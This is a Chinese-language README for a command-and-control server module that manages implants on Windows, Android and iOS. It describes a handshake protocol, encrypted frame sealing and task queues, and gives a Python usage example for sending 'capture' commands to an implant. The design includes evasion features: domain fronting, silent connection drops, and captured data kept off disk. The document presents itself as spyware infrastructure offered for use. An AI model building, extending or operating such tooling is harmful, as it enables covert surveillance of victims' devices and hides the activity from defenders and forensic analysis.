# 13_c2_server — C2 服务端

服务端核心：承载 implant 连接、PSK 握手派生、任务下发、密封帧接收。

## 架构

```
implant (agent_windows / agent_android / agent_ios)
    │   TCP / 域名前置 / WebSocket（传输层可替换）
    ▼
┌─────────────────────────────────────────────┐
│  C2Server (server.py)                       │
│  ├─ 握手状态机  Hello→Welcome→Finished       │
│  ├─ SealedEnvelope (GCM 双密钥分离)          │
│  ├─ ReplayWindow  按 (id, gen) 隔离          │
│  ├─ 任务队列  心跳时原子 CAS 领取            │
│  └─ 帧接收钩子  明文不出进程、不落盘          │
├─────────────────────────────────────────────┤
│  protocol/messages.py  消息 payload 定义      │
│  storage/store.py     SQLite 持久化层        │
└─────────────────────────────────────────────┘
```

## 协议消息

| 方向 | 类型 | 用途 |
|------|------|------|
| S→C | `0x10` CAPTURE_FRAME | 下发采集指令 |
| S→C | `0x11` HEARTBEAT_ACK | 心跳响应 |
| C→S | `0x20` HEARTBEAT | 心跳，拉取任务 |
| C→S | `0x21` FRAME_DATA | 密封帧回传 |
| C→S | `0x22` FRAME_META | 元数据（灯光/失败原因） |

## 使用

```python
from server import C2Server

server = C2Server(psk=PSK_128BIT, salt_reg=SALT_32B, server_static_id=ID_16B)
server.register_transport(send_fn, close_fn)

# 传输层收到字节后喂入
server.on_bytes(implant_id, generation, raw_bytes)

# 主动下发采集
rid = server.dispatch_capture("impl-001", 640, 480)
```

## 不变量（来自 v3 设计文档 §3、§7）

- **先验签后 accept**：GCM 验签失败立即关闭连接，不污染重放窗口
- **重放窗口按 `(implant_id, key_generation)` 隔离**，跨重连不重置
- **任务领取为原子 CAS**，防止重复下发
- **采集帧明文不出进程、不落盘**，只存元数据索引
- **异常一律静默关闭**，不回显原因

## 测试

```
python3 tests/test_server.py
```

## 已知约束

- 本模块为协议层参考实现，不含传输层（TCP 监听/域名前置需自行注入）
- 帧数据不落盘，需覆写 `_frame_received` 钩子接入分析管线
- `storage/store.py` 的 SQLite 需 Python 3.7+
